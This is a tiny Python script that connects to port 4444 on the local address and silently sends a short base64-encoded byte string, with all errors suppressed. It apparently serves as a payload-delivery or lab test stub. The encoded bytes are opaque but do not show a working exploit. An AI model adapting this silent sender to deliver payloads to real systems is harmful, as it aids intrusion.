import binascii as b
import socket as s
o=s.socket(s.AF_INET,s.SOCK_STREAM)
try:
 o.connect(('0.0.0.0',4444))
 o.send(b.a2b_base64('I5vbCGdCQ6Wii76H7H0fzA=='))
 o.close()
except:
 pass
